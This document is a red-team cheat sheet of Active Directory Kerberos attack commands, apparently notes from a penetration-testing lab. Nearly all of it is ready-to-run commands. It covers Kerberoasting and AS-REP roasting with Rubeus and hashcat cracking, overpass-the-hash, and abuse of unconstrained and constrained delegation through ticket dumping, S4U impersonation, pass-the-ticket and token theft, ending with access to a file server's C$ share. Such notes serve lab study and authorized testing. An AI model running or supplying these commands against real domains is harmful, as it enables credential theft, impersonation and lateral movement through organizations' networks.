### Kerberoasting
```
powershell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
execute-assembly C:\Users\Public\Rubeus.exe kerberoast /outfile:hashes.asreproast
execute-assembly C:\Users\Public\Rubeus.exe kerberoast /domain:dev.insomnia.co.mm
hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt -o winpass2.txt --force  --potfile-disable
```

### ASREPRoasting
```
powershell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
execute-assembly C:\Users\Public\Rubeus.exe  kerberoast format:hashcat /outfile:hashes.asreproast
execute-assembly C:\Users\Public\Rubeus.exe asreproast /domain:dev.insomnia.co.mm
hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable
```
### Overpass-the-Hash
```
execute-assembly C:\Users\Public\Rubeus.exe  triage
Rubeus asktgt /user:n.John /rc4:2e8a408a8aec852ef2e458b938b8c071
Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
```
### Unconstrained Delegation
the server or the service account that is granted this right is able to impersonate a user to authenticate to any services on any host,you are granting that account permission to delegate to any service
```
powershell Get-DomainComputer -Unconstrained -Properties DnsHostName
powershell Get-DomainGPOLocalGroup
powershell Get-DomainGroupMember -identity 'Workstation Admins' -recurse | select -exp membername 
powershell Get-DomainGroupMember -identity 'Helpdesk\Admins' -recurse | select -exp membername  
powershell Get-DomainOU -GPLink '{66465373-16CB-4F96-BD3A-12AE7D2C2371}' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
powershell Find-DomainUserLocation -userIdentity 'Workstation\Admins'  

execute-assembly C:\Users\Public\Rubeus.exe triage
execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1c6be # krbtgt/insomnia.ninja along with LUID
execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x21d8e17 /ticket:[...snip...]
steal_token 4652
```
### Constrained Delegation
constrained delegation takes it a step further by allowing you to configure which services an account can be delegated to.it limits delegation to a specified list, rather than allowing delegation to any service as in unconstrained delegation.
```
powershell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
powershell Get-DomainComputer web-2.cyberbotic.io | select -exp msds-AllowedToDelegateTo 
powershell Get-DomainComputer -TrustedToAuth | select -exp dnshostname 
powershell Get-DomainComputer web-2.cyberbotic.io | select -exp msds-AllowedToDelegateTo #To find what services it could delegate for
execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x239b995 /ticket:[...snip...]
steal_token 3420
ls \\fs-1.cyberbotic.io\c$
```


